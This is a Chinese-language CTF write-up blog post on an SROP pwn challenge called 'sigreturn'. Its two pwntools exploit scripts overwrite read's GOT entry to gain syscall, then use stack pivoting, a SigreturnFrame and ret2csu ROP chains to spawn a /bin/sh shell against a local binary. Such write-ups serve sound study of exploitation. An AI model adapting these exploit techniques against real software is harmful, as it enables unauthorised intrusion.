---
layout: article
pageview: true
key: 2021-12-20-sigreturn-pwn-wp
title: pwn-sigreturn
author: Ch4rc0al
categories: 
    - WriteUps
tags: 
    - Pwn
    - CTF
---
记录一道SROP题目
<!--more-->

题目来源网络，题目名称为sigreturn，需要注意的是题目中并没有`syscall`代码，需要修改`read`函数的got表来获取，值得注意的是`read`函数在修改后功能不会发生变化。

题目有两种做法，由于`main`函数中溢出长度较小，我们可以在`bss`段上布置好`rop`链和`sigframe`内容后，修改`read`函数的got表为`syscall`，栈迁移到`bss`段，代码如下。
```python
from pwn import *
context(arch='amd64',log_level='debug')

p=process('./pwn')
elf=ELF('./pwn')
libc=ELF('./libc.so.6')
r=''
local=1
if local!=1:
    p=r

pad='\0'*0x10+p64(1)

def csu(call,rdi,rsi,rdx):
    csu_end=0x40071a
    csu_front=0x400700
    payload=p64(csu_end)+p64(0)+p64(1)+p64(call)+p64(rdx)+p64(rsi)+p64(rdi)+p64(csu_front)+'\x00'*0x38
    return payload

bss=elf.bss()+0x100
p_rdi=0x0000000000400723
p_rsi_r15=0x0000000000400721
leave_ret=0x00000000004006af

sigframe=SigreturnFrame()
sigframe.rax=constants.SYS_execve
sigframe.rdi=bss
sigframe.rsi=0
sigframe.rdx=0
sigframe.rip=elf.plt['read']

log.info(hex(len(str(sigframe))))

pay=pad+csu(elf.got['read'],0,bss,0x500)+p64(0x400687)

p.send(pay.ljust(0xa0,'\x00'))
sleep(0.1)

p.send('/bin/sh\x00'+csu(elf.got['read'],0,bss+0x500,15)+p64(elf.plt['read'])+str(sigframe))

pay=pad+csu(elf.got['read'],0,elf.got['read'],1)+p64(0x400687)
p.send(pay.ljust(0xa0,'\x00'))
sleep(0.1)

p.send('\x5e')

pay='b'*0x10+p64(bss)+p64(leave_ret)
p.send(pay.ljust(0xa0,'\x00'))
sleep(0.1)

p.send('\0'*15)

p.interactive()
```

由于我们有`syscall`，也可以通过`rop`链的方式使用系统调用号来执行`execve("/bin/sh",0,0)`,该方法需要尽可能利用csu代码，代码如下。
```python
from pwn import *
context(arch='amd64',log_level='debug')

p=process('./pwn')
elf=ELF('./pwn')
libc=ELF('./libc.so.6')
r=''
local=1
if local!=1:
    p=r

pad='\0'*0x10+p64(1)

def csu(call,rdi,rsi,rdx):
    csu_end=0x40071a
    csu_front=0x400700
    payload=p64(csu_end)+p64(0)+p64(1)+p64(call)+p64(rdx)+p64(rsi)+p64(rdi)+p64(csu_front)+'\x00'*0x38
    return payload

binsh=elf.bss()+0x100
p_rdi=0x0000000000400723
p_rsi_r15=0x0000000000400721

pay=pad+csu(elf.got['read'],0,binsh,8)+p64(0x400687)

p.send(pay.ljust(0xa0,'\x00'))
sleep(0.1)
p.send('/bin/sh\x00')


pay=pad+csu(elf.got['read'],0,elf.got['read'],1)+p64(0x400687)
p.send(pay.ljust(0xa0,'\0'))
sleep(0.1)

p.send('\x5e')
gdb.attach(p)

#rbx已经为0，rbp为1，两次手动调用csu可以省下很多空间
pay=pad+p64(0x40071c)+p64(elf.got['read'])+p64(59)+p64(binsh+8)+p64(0)+p64(0x400700)+'\0'*0x18+p64(elf.got['read'])+p64(0)*2+p64(binsh)+p64(0x400700)
p.send(pay.ljust(0xa0,'\0'))
sleep(0.1)
p.send('\0'*59)

p.interactive()
```